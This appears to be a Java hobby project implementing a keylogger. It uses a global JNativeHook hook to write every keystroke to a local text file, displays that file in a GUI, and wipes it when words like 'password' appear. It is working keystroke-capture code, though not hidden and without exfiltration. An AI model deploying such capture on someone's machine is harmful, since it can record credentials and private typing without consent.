package org.example;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import java.io.*;
import java.util.Timer;
import java.util.TimerTask;


public class Keylogger implements NativeKeyListener {
    private static BufferedWriter writer;
    private static Timer timer;
    private static final String[] MALICIOUS_STRINGS = {"password", "credit card", "social security"};
    boolean isShiftDown = false;

    public Keylogger() {
        try {
            // Create a FileWriter object using the specified file name.
            FileWriter fileWriter = new FileWriter("keystrokes.txt", true);

            // Create a BufferedWriter object to write to the file.
            writer = new BufferedWriter(fileWriter);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public static void main(String[] args) throws FileNotFoundException {
        try {
            // Initialize native hook.
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException ex) {
            System.err.println("There was a problem registering the native hook.");
            System.err.println(ex.getMessage());
            System.exit(1);
        }

        // Add the native key listener
        GlobalScreen.addNativeKeyListener(new Keylogger());
        // Invoking GUI for Displaying "Keystrokes.txt"
        KeyLoggerGUI gui = new KeyLoggerGUI();

        //Scanning "Keystrokes.txt" for malicious activity in regular time intervals
        Timer timer = new Timer();
        timer.schedule(new TimerTask() {
            @Override
            public void run() {
                try {
                    File logFile = new File("keystrokes.txt");
                    FileReader fr = new FileReader(logFile);
                    BufferedReader br = new BufferedReader(fr);
                    String line;
                    while ((line = br.readLine()) != null) {
                        for (String s : MALICIOUS_STRINGS) {
                            if (line.contains(s)) {
                                System.out.println("Malicious Activity Detected!");
                                clear("keystrokes.txt");
                                break;
                            }
                        }
                    }
                    br.close();
                }catch (IOException e){
                    System.out.println("Exception Arised");
                }
            }
        }, 0, 1000);

    }

    //for writing into buffer and appending the data into "Keystrokes.txt"
    public static void fileMaker(BufferedWriter writer,String s){
        try{
            writer.write(s);
            writer.flush();
        }catch (IOException e){
            System.out.println("Exception Raised");
        }
    }

    //clearing the "Keystrokes.txt" in regular intervals
    public static void clear(String filename) throws IOException {
        FileWriter fwOb = new FileWriter(filename, false);
        PrintWriter pwOb = new PrintWriter(fwOb, false);
        pwOb.flush();
        pwOb.close();
        fwOb.close();
    }




    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {
        System.out.println("Key Pressed: "+e.getKeyText(e.getKeyCode()));
        System.out.println("Key code: "+e.getKeyCode());
        makeEntry(e,writer);
//        keyGenerator(e);
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent e) {
        int keyCode = e.getKeyCode();

//        if (keyCode == NativeKeyEvent.VC_SHIFT) {
//            shiftPressed = false;
//        }
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent e) {
        // not used in this example
    }

    //To get the Keystroke info and perform actions accordingly
    public void makeEntry(NativeKeyEvent nativeKeyEvent,BufferedWriter writer){
        String pressedKey = NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode());
        int keyCode = nativeKeyEvent.getKeyCode();
        int modifiers =  nativeKeyEvent.getModifiers();
        if(pressedKey=="Escape"||pressedKey=="Ctrl"||pressedKey=="Alt"){
           fileMaker(writer,"");
        } else if (pressedKey=="Space") {
            fileMaker(writer," ");
        }else if(pressedKey=="Tab"){
            fileMaker(writer,"   ");
        } else if(pressedKey=="Semicolon"){
            fileMaker(writer,";");
        } else if(pressedKey=="Period"){
            fileMaker(writer,".");
        } else if(pressedKey=="Comma"){
            fileMaker(writer,",");
        } else if(pressedKey=="Open Bracket"){
            fileMaker(writer,"[");
        } else if(pressedKey=="Close Bracket"){
            fileMaker(writer,"]");
        } else if(pressedKey=="Quote"){
            fileMaker(writer,"'");
        } else if(pressedKey=="Slash"){
            fileMaker(writer,"/");
        } else if(pressedKey=="Back Slash"){
            fileMaker(writer,"\\");
        }else if(pressedKey=="Enter"){
            try {
                writer.newLine();
                writer.flush();
            }catch (IOException e){
                System.out.println("Exception Raised");
            }
        }else if(pressedKey=="Shift"){
            fileMaker(writer,"");
        }else {

            switch (nativeKeyEvent.getKeyCode()){
                case 16:
                    fileMaker(writer,"q");
                    break;
                case 17:
                    fileMaker(writer,"w");
                    break;
                case 18:
                    fileMaker(writer,"e");
                    break;
                case 19:
                    fileMaker(writer,"r");
                    break;
                case 20:
                    fileMaker(writer,"t");
                    break;
                case 21:
                    fileMaker(writer,"y");
                    break;
                case 22:
                    fileMaker(writer,"u");
                    break;
                case 23:
                    fileMaker(writer,"i");
                    break;
                case 24:
                    fileMaker(writer,"o");
                    break;
                case 25:
                    fileMaker(writer,"p");
                    break;
                case 30:
                    fileMaker(writer,"a");
                    break;
                case 31:
                    fileMaker(writer,"s");
                    break;
                case 32:
                    fileMaker(writer,"d");
                    break;
                case 33:
                    fileMaker(writer,"f");
                    break;
                case 34:
                    fileMaker(writer,"g");
                    break;
                case 35:
                    fileMaker(writer,"h");
                    break;
                case 36:
                    fileMaker(writer,"j");
                    break;
                case 37:
                    fileMaker(writer,"k");
                    break;
                case 38:
                    fileMaker(writer,"l");
                    break;
                    //Third Row
                case 44:
                    fileMaker(writer,"z");
                    break;
                case 45:
                    fileMaker(writer,"x");
                    break;
                case 46:
                    fileMaker(writer,"c");
                    break;
                case 47:
                    fileMaker(writer,"v");
                    break;
                case 48:
                    fileMaker(writer,"b");
                    break;
                case 49:
                    fileMaker(writer,"n");
                    break;
                case 50:
                    fileMaker(writer,"m");
                    break;
            }
            }

            }
        }




